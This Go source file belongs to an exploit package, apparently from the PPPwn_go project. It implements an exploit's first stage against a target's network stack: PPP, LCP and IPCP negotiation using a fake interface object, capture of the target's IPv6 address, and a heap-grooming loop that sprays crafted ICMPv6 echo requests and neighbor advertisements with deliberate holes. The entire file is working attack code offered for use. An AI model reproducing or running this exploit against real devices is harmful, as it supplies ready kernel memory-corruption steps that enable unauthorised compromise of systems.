package exploit

import (
	"fmt"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"net"

	"github.com/wetor/PPPwn_go/internal/logger"
	"github.com/wetor/PPPwn_go/internal/packet"
)

func (e *Exploit) runStage0() (err error) {
	err = e.pppNegotiation(e.BuildFakeIfnet, true)
	if err != nil {
		return err
	}
	err = e.lcpNegotiation()
	if err != nil {
		return err
	}
	err = e.ipcpNegotiation()
	if err != nil {
		return err
	}

	logger.Infof("[*] Waiting for interface to be ready...")
	ipv6Pkt := &layers.IPv6{}
	err = e.p.Receive(&packet.ReceiveParams{
		Ctx: e.ctx,
		Log: true,
		Layer: []*packet.LayerValue{
			{
				Layer: layers.LayerTypeIPv6,
				Value: ipv6Pkt,
				Check: func(val any) bool {
					if p, ok := val.(*layers.IPv6); ok {
						ipv6Pkt = p
						return true
					}
					return false
				},
			},
			{
				Layer: layers.LayerTypeICMPv6RouterSolicitation,
				Check: func(val any) bool {
					return true
				},
			},
		},
	})
	if err != nil {
		return err
	}

	e.targetIPv6 = ipv6Pkt.SrcIP
	logger.Infof("[+] Target IPv6: %v", e.targetIPv6.String())

	for i := 0; i < SPRAY_NUM; i++ {
		if i%0x100 == 0 {
			fmt.Printf("[*] Heap grooming...%d%%\r", int(float32(i)/float32(SPRAY_NUM)*100))
		}

		// send
		sourceIPv6 := net.ParseIP(fmt.Sprintf("fe80::%04x:4141:4141:4141", i))
		err = e.p.SendICMPv6(&packet.SendICMPv6Params{
			SrcMAC:       e.sourceMac,
			DstMAC:       e.targetMac,
			EthernetType: layers.EthernetTypeIPv6,
			SrcIP:        sourceIPv6,
			DstIP:        e.targetIPv6,
			HopLimit:     64,
			ICMPv6Type:   layers.ICMPv6TypeEchoRequest,
			Layers: []gopacket.SerializableLayer{
				&layers.ICMPv6Echo{},
			},
		})
		if err != nil {
			return err
		}

		// recv
		_, _, err = e.p.ReceiveICMPv6NS(e.ctx, false)
		if err != nil {
			return err
		}

		if i >= HOLE_START && i%HOLE_SPACE == 0 {
			continue
		}

		// send
		err = e.p.SendICMPv6(&packet.SendICMPv6Params{
			SrcMAC:       e.sourceMac,
			DstMAC:       e.targetMac,
			EthernetType: layers.EthernetTypeIPv6,
			SrcIP:        sourceIPv6,
			DstIP:        e.targetIPv6,
			HopLimit:     255,
			ICMPv6Type:   layers.ICMPv6TypeNeighborAdvertisement,
			Layers: []gopacket.SerializableLayer{
				&layers.ICMPv6NeighborAdvertisement{
					TargetAddress: sourceIPv6,
					Flags:         0xE0,
					Options: []layers.ICMPv6Option{
						{
							Type: layers.ICMPv6OptTargetAddress,
							Data: e.sourceMac,
						},
					},
				},
			},
		})
		if err != nil {
			return err
		}
	}
	logger.Infof("[+] Heap grooming...done")
	return nil
}
